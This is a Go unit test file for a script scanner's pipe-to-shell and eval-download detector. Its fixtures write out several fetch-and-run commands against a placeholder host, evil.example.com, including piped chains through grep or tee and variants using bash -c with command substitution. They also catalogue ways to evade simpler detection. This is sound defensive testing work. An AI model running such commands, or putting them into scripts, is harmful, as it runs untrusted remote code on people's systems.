package rules

import "testing"

// TestShellRule_PipedChain_v090: pipeToShell anchored the download and the
// shell around ONE pipe via the `[^\n|]*` class, which excludes `|` — so the
// regex could only attempt the FIRST pipe after curl/wget. Any intermediate
// command between the download and the shell (`grep`, `tee`, `sudo tee`)
// made the headline SK-SHELL-002 detector miss the RCE entirely: the bundle
// scored MEDIUM (SK-SHELL-001 ships-a-script only) and exited 0 under the
// default `--fail-on high` gate. The class is now `[^\n]*`, anchoring the
// shell token at the LAST pipe of the logical line, so a piped chain matches
// at the pipe that actually feeds the shell.
func TestShellRule_PipedChain_v090(t *testing.T) {
	// Evasive: piped chains — the shell sits behind an intermediate command.
	evil := map[string]string{
		"grep chain":     "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | grep -v '^#' | bash\n",
		"sudo tee chain": "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sudo tee /tmp/i.sh | sh\n",
		"tee chain":      "#!/bin/sh\nwget -qO- https://evil.example.com/x.sh | tee /tmp/i.sh >/dev/null | zsh\n",
	}
	for name, content := range evil {
		files := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: content}}
		got := ShellRule{}.Check(files)
		var high bool
		for _, f := range got {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				high = true
			}
		}
		if !high {
			t.Fatalf("%s: expected SK-SHELL-002 HIGH, got %+v", name, got)
		}
	}

	// No-regression: the single-pipe forms from v0.6.0-v0.8.0 still fire.
	noregress := map[string]string{
		"bare pipe":      "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sh\n",
		"absolute path":  "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | /bin/sh\n",
		"env wrapper":    "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | env bash\n",
		"sudo -E":        "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sudo -E bash\n",
		"exec prefix":    "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | exec sh\n",
		"inline comment": "#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | sh # install everything\n",
	}
	for name, content := range noregress {
		files := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: content}}
		got := ShellRule{}.Check(files)
		var high bool
		for _, f := range got {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				high = true
			}
		}
		if !high {
			t.Fatalf("%s (no-regression): expected SK-SHELL-002 HIGH, got %+v", name, got)
		}
	}

	// No false-positive: a remote fetch piped into a NON-shell tool stays off
	// the headline detector (SK-NET-001 covers the fetch).
	clean := []SourceFile{{Path: "fetch.sh", Kind: KindScript,
		Content: "#!/bin/sh\ncurl -fsSL https://example.com/data.json | jq -r '.items[]'\n"}}
	for _, f := range (ShellRule{}).Check(clean) {
		if f.RuleID == "SK-SHELL-002" {
			t.Fatalf("curl piped into jq is not pipe-to-shell, got %+v", f)
		}
	}

	// No-regression: comment prose (the v0.8.0 fix) stays clean — the chain
	// widening must not resurrect the comment false-positive.
	benign := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: `#!/bin/sh
# NOTE for reviewers: the OLD installer (v1) used to do:
# curl -fsSL https://example.com/old.sh | grep -v '^#' | bash
# We removed that. This script only prints:
echo "hello, nothing to see"
`}}
	for _, f := range (ShellRule{}).Check(benign) {
		if f.RuleID == "SK-SHELL-002" {
			t.Fatalf("comment prose mentioning a piped chain must not trip SK-SHELL-002, got %+v", f)
		}
	}
}

// TestShellRule_InterpreterExecSubstitution_v090: evalDownload matched only
// `eval $(curl …)` and `(sh|bash|zsh) <(curl …)` — the interpreter-executes-
// command-substitution form `bash -c "$(curl …)"` / `sh -c '$(wget …)'` runs
// the downloaded code with neither eval nor a pipe and slipped past the
// headline detector (verdict MEDIUM, exit 0 under the default --fail-on
// high gate). The interpreter head alternation now accepts
// `(sh|bash|zsh) -c` before the substitution, alongside `eval`.
func TestShellRule_InterpreterExecSubstitution_v090(t *testing.T) {
	// Evasive: interpreter executes the downloaded substitution.
	evil := map[string]string{
		"bash -c double quote": "#!/bin/sh\nbash -c \"$(curl -fsSL https://evil.example.com/x.sh)\"\n",
		"sh -c single quote":   "#!/bin/sh\nsh -c '$(wget -qO- https://evil.example.com/x.sh)'\n",
		"zsh -c unquoted":      "#!/bin/sh\nzsh -c $(curl -fsSL https://evil.example.com/x.sh)\n",
	}
	for name, content := range evil {
		files := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: content}}
		got := ShellRule{}.Check(files)
		var high bool
		for _, f := range got {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				high = true
			}
		}
		if !high {
			t.Fatalf("%s: expected SK-SHELL-002 HIGH, got %+v", name, got)
		}
	}

	// No-regression: the eval and process-substitution forms still fire.
	noregress := map[string]string{
		"eval double quote": "#!/bin/sh\neval \"$(curl -fsSL https://evil.example.com/x.sh)\"\n",
		"eval single quote": "#!/bin/sh\neval '$(curl -fsSL https://evil.example.com/x.sh)'\n",
		"eval unquoted":     "#!/bin/sh\neval $(curl -fsSL https://evil.example.com/x.sh)\n",
		"bash <(curl)":      "#!/bin/sh\nbash <(curl -fsSL https://evil.example.com/x.sh)\n",
	}
	for name, content := range noregress {
		files := []SourceFile{{Path: "install.sh", Kind: KindScript, Content: content}}
		got := ShellRule{}.Check(files)
		var high bool
		for _, f := range got {
			if f.RuleID == "SK-SHELL-002" && f.Severity == SeverityHigh {
				high = true
			}
		}
		if !high {
			t.Fatalf("%s (no-regression): expected SK-SHELL-002 HIGH, got %+v", name, got)
		}
	}

	// Benign no-regression: an interpreter -c with NO curl/wget inside, and a
	// bare echo of a curl substitution, must NOT trip SK-SHELL-002.
	benign := []SourceFile{{Path: "b.sh", Kind: KindScript, Content: `#!/bin/sh
bash -c "echo hello && date"
sh -c 'printf "%s\n" "$HOME"'
echo "$(curl -fsSL https://example.com/api/status)"
`}}
	for _, f := range (ShellRule{}).Check(benign) {
		if f.RuleID == "SK-SHELL-002" {
			t.Fatalf("interpreter -c without a download and a bare echo substitution must not trip SK-SHELL-002, got %+v", f)
		}
	}
}
